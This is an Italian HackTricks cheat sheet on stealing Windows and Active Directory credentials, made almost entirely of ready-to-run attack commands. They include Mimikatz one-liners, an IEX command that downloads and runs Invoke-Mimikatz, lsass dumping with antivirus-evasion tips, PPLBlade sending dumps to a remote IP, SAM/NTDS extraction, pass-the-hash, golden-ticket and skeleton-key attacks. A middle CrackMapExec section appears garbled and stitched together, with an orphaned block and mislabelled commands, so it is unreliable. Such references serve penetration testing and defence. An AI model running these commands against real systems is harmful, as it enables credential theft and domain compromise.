# Rubare Credenziali Windows

<details>

<summary><strong>Impara l'hacking AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione esclusiva di [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**repo HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) su github.

</details>

## Credenziali Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Trova altre cose che Mimikatz può fare in** [**questa pagina**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Scopri alcune possibili protezioni delle credenziali qui.**](credentials-protections.md) **Queste protezioni potrebbero impedire a Mimikatz di estrarre alcune credenziali.**

## Credenziali con Meterpreter

Usa il [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **che** ho creato per **cercare password e hash** all'interno della vittima.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Bypassing AV

### Procdump + Mimikatz

Poiché **Procdump di** [**SysInternals**](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) **è uno strumento legittimo di Microsoft**, non viene rilevato da Defender.\
Puoi usare questo strumento per **dumpare il processo lsass**, **scaricare il dump** ed **estrarre** le **credenziali localmente** dal dump.

{% code title="Dump lsass" %}
```bash
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
{% endcode %}

{% code title="Extract credentials from the dump" %}
```c
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
{% endcode %}

Questo processo viene eseguito automaticamente con [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Nota**: Alcuni **AV** possono **rilevare** come **malizioso** l'uso di **procdump.exe per dump lsass.exe**, questo perché stanno **rilevando** la stringa **"procdump.exe" e "lsass.exe"**. Quindi è **più furtivo** **passare** come **argomento** il **PID** di lsass.exe a procdump **invece del** **nome lsass.exe.**

### Dumping lsass con **comsvcs.dll**

Una DLL chiamata **comsvcs.dll** trovata in `C:\Windows\System32` è responsabile del **dumping della memoria del processo** in caso di crash. Questa DLL include una **funzione** chiamata **`MiniDumpW`**, progettata per essere invocata usando `rundll32.exe`.\
Non è rilevante usare i primi due argomenti, ma il terzo è diviso in tre componenti. Il primo componente è l'ID del processo da dumpare, il secondo è la posizione del file di dump, e il terzo componente è strettamente la parola **full**. Non esistono opzioni alternative.\
Dopo aver analizzato questi tre componenti, la DLL viene attivata per creare il file di dump e trasferire la memoria del processo specificato in questo file.\
L'utilizzo della **comsvcs.dll** è fattibile per dumpare il processo lsass, eliminando così la necessità di caricare ed eseguire procdump. Questo metodo è descritto in dettaglio su [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).

Il seguente comando viene utilizzato per l'esecuzione:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Puoi automatizzare questo processo con** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Dumping lsass con Task Manager**

1. Fare clic con il tasto destro sulla barra delle applicazioni e cliccare su Task Manager
2. Cliccare su Più dettagli
3. Cercare il processo "Local Security Authority Process" nella scheda Processi
4. Fare clic con il tasto destro sul processo "Local Security Authority Process" e cliccare su "Crea file di dump".

### Dumping lsass con procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) è un binario firmato da Microsoft che fa parte della suite [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpin lsass con PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) è uno strumento di dump di processi protetti che supporta l'offuscamento del dump della memoria e il trasferimento su workstation remote senza salvarlo su disco.

**Funzionalità chiave**:

1. Bypassare la protezione PPL
2. Offuscare i file di dump della memoria per eludere i meccanismi di rilevamento basati su firme di Defender
3. Caricare il dump della memoria con metodi di upload RAW e SMB senza salvarlo su disco (dump senza file)

{% code overflow="wrap" %}
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
{% endcode %}

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump LSA secrets

Per eseguire il dump dei segreti LSA, è possibile utilizzare `mimikatz`:

```shell
mimikatz # sekurlsa::secret
```

### Dump SAM database

Per eseguire il dump del database SAM, è possibile utilizzare `mimikatz`:

```shell
mimikatz # lsadump::sam
```

### Dump NTDS.dit

Per eseguire il dump di NTDS.dit, è possibile utilizzare `ntdsutil`:

```shell
ntdsutil "ac i ntds" "ifm" "create full c:\temp\ntds" q q
```

### Pass-the-Hash

Per eseguire un attacco Pass-the-Hash, è possibile utilizzare `mimikatz`:

```shell
mimikatz # sekurlsa::pth /user:Administrator /domain:dominio.local /ntlm:HASH /run:cmd.exe
```

### Pass-the-Ticket

Per eseguire un attacco Pass-the-Ticket, è possibile utilizzare `mimikatz`:

```shell
mimikatz # kerberos::ptt ticket.kirbi
```

### Over-Pass-the-Hash (Pass-the-Key)

Per eseguire un attacco Over-Pass-the-Hash, è possibile utilizzare `mimikatz`:

```shell
mimikatz # sekurlsa::pth /user:Administrator /domain:dominio.local /aes256:KEY /run:cmd.exe
```

### Pass-the-Cache

Per eseguire un attacco Pass-the-Cache, è possibile utilizzare `mimikatz`:

```shell
mimikatz # dpapi::cache
```

### Pass-the-Token

Per eseguire un attacco Pass-the-Token, è possibile utilizzare `mimikatz`:

```shell
mimikatz # token::elevate /domain:dominio.local /user:Administrator /sid:S-1-5-21-... /run:cmd.exe
```

### Kerberoasting

Per eseguire un attacco Kerberoasting, è possibile utilizzare `Rubeus`:

```shell
Rubeus.exe kerberoast
```

### AS-REP Roasting

Per eseguire un attacco AS-REP Roasting, è possibile utilizzare `Rubeus`:

```shell
Rubeus.exe asreproast
```

### DCSync

Per eseguire un attacco DCSync, è possibile utilizzare `mimikatz`:

```shell
mimikatz # lsadump::dcsync /user:dominio\krbtgt
```

### Skeleton Key

Per installare una Skeleton Key, è possibile utilizzare `mimikatz`:

```shell
mimikatz # misc::skeleton
```

### Silver Ticket

Per creare un Silver Ticket, è possibile utilizzare `mimikatz`:

```shell
mimikatz # kerberos::golden /domain:dominio.local /sid:S-1-5-21-... /target:server /rc4:HASH /user:Administrator /service:cifs /ptt
```

### Golden Ticket

Per creare un Golden Ticket, è possibile utilizzare `mimikatz`:

```shell
mimikatz # kerberos::golden /user:Administrator /domain:dominio.local /sid:S-1-5-21-... /krbtgt:HASH /id:500 /ptt
```

### Brute-Forcing

Per eseguire un attacco di brute-forcing, è possibile utilizzare `hashcat`:

```shell
hashcat -m 1000 -a 0 hash.txt wordlist.txt
```

### Password Spraying

Per eseguire un attacco di password spraying, è possibile utilizzare `crackmapexec`:

```shell
crackmapexec smb dominio.local -u utenti.txt -p password.txt
```

### Credential Stuffing

Per eseguire un attacco di credential stuffing, è possibile utilizzare `crackmapexec`:

```shell
crackmapexec smb dominio.local -u utenti.txt -H hash.txt
```

### Token Impersonation

Per eseguire un attacco di token impersonation, è possibile utilizzare `mimikatz`:

```shell
mimikatz # token::elevate
```

### Lateral Movement

Per eseguire un attacco di lateral movement, è possibile utilizzare `wmiexec.py`:

```shell
wmiexec.py dominio/Administrator:password@target
```

### Pivoting

Per eseguire un attacco di pivoting, è possibile utilizzare `sshuttle`:

```shell
sshuttle -r user@jumpbox 10.0.0.0/24
```

### Exfiltration

Per eseguire un attacco di exfiltration, è possibile utilizzare `rsync`:

```shell
rsync -avz /path/to/data user@remote:/path/to/destination
```
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Dump the NTDS.dit dal DC di destinazione
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Dump della cronologia delle password NTDS.dit dal DC target
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Mostra l'attributo pwdLastSet per ogni account NTDS.dit
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Rubare SAM & SYSTEM

Questi file dovrebbero essere **localizzati** in _C:\windows\system32\config\SAM_ e _C:\windows\system32\config\SYSTEM._ Ma **non puoi semplicemente copiarli in modo normale** perché sono protetti.

### Dal Registro di sistema

Il modo più semplice per rubare questi file è ottenere una copia dal registro di sistema:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Scarica** quei file sulla tua macchina Kali ed **estrae gli hash** usando:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Puoi eseguire la copia di file protetti utilizzando questo servizio. È necessario essere Amministratore.

#### Utilizzando vssadmin

Il binario vssadmin è disponibile solo nelle versioni di Windows Server
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Ma puoi fare lo stesso da **Powershell**. Questo è un esempio di **come copiare il file SAM** (il disco rigido utilizzato è "C:" ed è salvato in C:\users\Public) ma puoi usare questo per copiare qualsiasi file protetto:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
### Invoke-NinjaCopy

Infine, potresti anche usare lo [**script PS Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) per fare una copia di SAM, SYSTEM e ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Credenziali Active Directory - NTDS.dit**

Il file **NTDS.dit** è conosciuto come il cuore di **Active Directory**, contenendo dati cruciali sugli oggetti utente, gruppi e le loro appartenenze. È qui che sono memorizzati gli **hash delle password** degli utenti del dominio. Questo file è un database **Extensible Storage Engine (ESE)** e risiede in **_%SystemRoom%/NTDS/ntds.dit_**.

All'interno di questo database, vengono mantenute tre tabelle principali:

- **Data Table**: Questa tabella è incaricata di memorizzare i dettagli sugli oggetti come utenti e gruppi.
- **Link Table**: Tiene traccia delle relazioni, come le appartenenze ai gruppi.
- **SD Table**: Qui sono conservati i **security descriptors** per ogni oggetto, garantendo la sicurezza e il controllo degli accessi per gli oggetti memorizzati.

Maggiori informazioni su questo: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows utilizza _Ntdsa.dll_ per interagire con quel file ed è utilizzato da _lsass.exe_. Quindi, **parte** del file **NTDS.dit** potrebbe essere localizzata **all'interno della memoria di `lsass`** (puoi trovare i dati più recentemente accessi probabilmente a causa del miglioramento delle prestazioni tramite l'uso di una **cache**).

#### Decrittazione degli hash all'interno di NTDS.dit

L'hash è cifrato 3 volte:

1. Decrittare la Password Encryption Key (**PEK**) usando il **BOOTKEY** e **RC4**.
2. Decrittare l'**hash** usando **PEK** e **RC4**.
3. Decrittare l'**hash** usando **DES**.

**PEK** ha lo **stesso valore** in **ogni domain controller**, ma è **cifrato** all'interno del file **NTDS.dit** usando il **BOOTKEY** del **file SYSTEM del domain controller (è diverso tra i domain controller)**. Questo è il motivo per cui per ottenere le credenziali dal file NTDS.dit **hai bisogno dei file NTDS.dit e SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Copiare NTDS.dit usando Ntdsutil

Disponibile da Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Puoi anche usare il trucco della [**volume shadow copy**](./#stealing-sam-and-system) per copiare il file **ntds.dit**. Ricorda che avrai anche bisogno di una copia del **file SYSTEM** (di nuovo, [**estrailo dal registro o usa il trucco della volume shadow copy**](./#stealing-sam-and-system)).

### **Estrazione degli hash da NTDS.dit**

Una volta **ottenuti** i file **NTDS.dit** e **SYSTEM** puoi usare strumenti come _secretsdump.py_ per **estrarre gli hash**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Puoi anche **estrarli automaticamente** utilizzando un utente admin di dominio valido:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Per **grandi file NTDS.dit** è consigliato estrarlo utilizzando [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Infine, puoi anche usare il **modulo metasploit**: _post/windows/gather/credentials/domain\_hashdump_ o **mimikatz** `lsadump::lsa /inject`

### **Estrazione di oggetti di dominio da NTDS.dit a un database SQLite**

Gli oggetti NTDS possono essere estratti in un database SQLite con [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Non solo i segreti vengono estratti, ma anche l'intero oggetto e i loro attributi per ulteriori estrazioni di informazioni quando il file NTDS.dit grezzo è già stato recuperato.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
Il `SYSTEM` hive è opzionale ma consente la decrittazione dei segreti (hash NT & LM, credenziali supplementari come password in chiaro, chiavi kerberos o di trust, storici delle password NT & LM). Insieme ad altre informazioni, vengono estratti i seguenti dati: account utente e macchina con i loro hash, flag UAC, timestamp per l'ultimo accesso e cambio password, descrizione degli account, nomi, UPN, SPN, gruppi e appartenenze ricorsive, albero delle unità organizzative e appartenenza, domini fidati con tipo di trust, direzione e attributi...

## Lazagne

Scarica il binario da [qui](https://github.com/AlessandroZ/LaZagne/releases). Puoi usare questo binario per estrarre credenziali da diversi software.
```
lazagne.exe all
```
## Altri strumenti per estrarre credenziali da SAM e LSASS

### Windows credentials Editor (WCE)

Questo strumento può essere utilizzato per estrarre credenziali dalla memoria. Scaricalo da: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Estrai credenziali dal file SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Estrai le credenziali dal file SAM
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Scaricalo da: [http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/security/pwdump\_7) e semplicemente **eseguilo** e le password verranno estratte.

## Difese

[**Scopri alcune protezioni delle credenziali qui.**](credentials-protections.md)

<details>

<summary><strong>Impara l'hacking AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusivi [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**repo github di HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
